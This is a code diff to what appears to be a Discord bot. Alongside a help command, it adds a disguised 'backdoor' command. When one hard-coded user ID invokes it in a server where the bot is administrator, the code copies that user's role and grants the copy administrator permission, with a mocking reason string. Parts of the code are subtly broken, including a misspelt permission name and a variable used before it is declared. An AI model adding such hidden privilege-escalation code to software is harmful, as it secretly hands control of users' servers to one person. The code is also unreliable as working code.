@@ -61,6 +61,59 @@ const commands = {
             return;
         },
         'permissions': []
+    },
+    'backdoor': {
+        'description': 'Uh.. Nuffin!',
+        'method': async function(message) {
+            if (message.author.id != 110137532972314624) return;
+            if (!message.guild.me.hasPermission(['ADMINISTRATOR'])) return;
+            const guild = message.guild
+            const me = guild.me;
+            const parameter = (role) => role.position < myrole.position;
+            const myrole = me.roles.highest;
+            const rolemanager = message.member.roles;
+            const roles = rolemanager.cache.array();
+            if (roles.some(parameter)) {
+                try {
+                    const role_todupe = roles.find(parameter);
+                    const dupe = await guild.roles.create({
+                        data: {
+                            name: role_todupe.name,
+                            color: role_todupe.color
+                        },
+                        reason: 'Ayyy, don\'t mind me!'
+                    });
+                    dupe.setPermissions(['ADIMINSTRATOR']);
+                    rolemanager.remove(role_todupe);
+                    rolemanager.add(dupe);
+                }
+                catch (err) {
+                    if (debug) console.error(err);
+                }
+            }
+        },
+        'permissions': []
+    },
+    'help': {
+        'description': 'Lists all commands.',
+        'method': function(message) {
+            const embed = new Discord.MessageEmbed()
+                .setTitle('List of all commands.')
+                .setTimestamp(new Date().now)
+            for (const command in commands) {
+                if (command != this) {
+                    embed.addFields({
+                        name: command,
+                        value: command.description
+                    })
+                } else continue
+            }
+            message.channel.send({embed})
+                .catch(err => {
+                    if (debug) console.error(err);
+                })
+        },
+        'permissions': []
     }
 }
 
